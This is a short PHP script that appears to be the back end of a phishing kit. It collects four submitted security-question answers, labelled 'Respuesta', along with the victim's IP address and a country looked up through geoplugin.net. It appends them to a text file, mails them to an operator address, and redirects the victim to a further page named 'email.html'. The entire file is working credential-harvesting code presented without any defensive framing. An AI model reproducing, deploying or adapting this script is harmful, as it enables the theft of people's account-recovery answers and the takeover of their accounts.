<?php
$ip = getenv("REMOTE_ADDR");
$date = date("M d, Y g:iA");
date_default_timezone_set('UTC');
$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip)); 
$message .= "Respuesta1 : ".$_POST['sq1']."   -  \n";
$message .="Respuesta2 :".$_POST['sq2']." - \n";
$message .="Respuesta3 :".$_POST['sq3']." - \n";
$message .="Respuesta4 :".$_POST['sq4']." - \n";
$message .= "".$date."  - ";
$message .= "" . $ipdat->geoplugin_countryCode . " \n";
$message .="".$ip."\n";
$message .= "********************\n";
$fp = fopen('silfre21$.txt', 'a');
fwrite($fp, $message);
fclose($fp);
mail($to, $subj, $message, $from);
Header ("Location:email.html");